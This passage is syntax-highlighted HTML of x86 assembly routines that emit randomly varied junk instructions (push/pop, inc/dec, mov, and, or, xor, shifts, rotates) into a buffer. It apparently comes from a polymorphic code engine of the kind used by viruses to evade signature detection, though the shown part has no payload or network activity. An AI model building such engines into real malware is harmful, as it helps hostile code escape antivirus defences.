    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GenPushPop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate push reg \ pop reg instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GenIncDec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate:inc reg\dec reg or dec reg\inc reg instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">decinc</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitincd</span><span class="sc0">
</span><span class="sc5">decinc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">exitincd</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GenMoveRegReg</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;gen mov reg,reg</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1f40h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3e8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7d0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bb8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fa0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg5</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1388</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg6</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1770h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f6h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg7</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1b58h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mreg8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitmreg</span><span class="sc0">
</span><span class="sc5">mreg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc0">
</span><span class="sc5">exitmreg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">GenAnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate and ebx\edx\ebp,trash instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nand1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wand</span><span class="sc0">
</span><span class="sc5">nand1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nand2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wand</span><span class="sc0">
</span><span class="sc5">nand2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e5h</span><span class="sc0">
</span><span class="sc5">wand</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">GenMove</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate mov ebx\edx\ebp,trash instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nmov1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wmov</span><span class="sc0">
</span><span class="sc5">nmov1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nmov2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wmov</span><span class="sc0">
</span><span class="sc5">nmov2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bdh</span><span class="sc0">
</span><span class="sc5">wmov</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GenPushTrashPopReg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;this function generate push trash\ pop ebp\ebx\edx instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">68h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nextpt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5dh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wpop</span><span class="sc0">
</span><span class="sc5">nextpt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nextpt2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5ah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wpop</span><span class="sc0">
</span><span class="sc5">nextpt2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">5bh</span><span class="sc0">
</span><span class="sc5">wpop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
    
</span><span class="sc5">GenShrReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;gen shr unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c1h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nshr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0edh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wshr</span><span class="sc0">
</span><span class="sc5">nshr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nshr2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0eah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wshr</span><span class="sc0">
</span><span class="sc5">nshr2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0ebh</span><span class="sc0">
</span><span class="sc5">wshr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">GenShlReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;gen shl unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c1h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nshl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0e3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wshl</span><span class="sc0">
</span><span class="sc5">nshl</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nshl2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0e2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wshl</span><span class="sc0">
</span><span class="sc5">nshl2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0e5h</span><span class="sc0">
</span><span class="sc5">wshl</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">GenRorReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;gen ror unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c1h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nror</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0cbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wror</span><span class="sc0">
</span><span class="sc5">nror</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nror2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0cah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wror</span><span class="sc0">
</span><span class="sc5">nror2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0cdh</span><span class="sc0">
</span><span class="sc5">wror</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc5">GenRolReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;gen rol unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c1h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nrol</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wrol</span><span class="sc0">
</span><span class="sc5">nrol</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nrol2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wrol</span><span class="sc0">
</span><span class="sc5">nrol2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0c5h</span><span class="sc0">
</span><span class="sc5">wrol</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">GenOrReg</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;gen or unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wor</span><span class="sc0">
</span><span class="sc5">nor</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nor2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wor</span><span class="sc0">
</span><span class="sc5">nor2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
</span><span class="sc5">wor</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GenXorReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;gen xor unusedreg,num</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nXor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wXor</span><span class="sc0">
</span><span class="sc5">nXor</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">nXor2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wXor</span><span class="sc0">
</span><span class="sc5">nXor2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc0">
</span><span class="sc5">wXor</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GenSubAddTrash</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;gen add reg,num\sub reg,num</span><span class="sc0">
</span><span class="sc5">noesp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">sub_f</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c4h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">noesp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
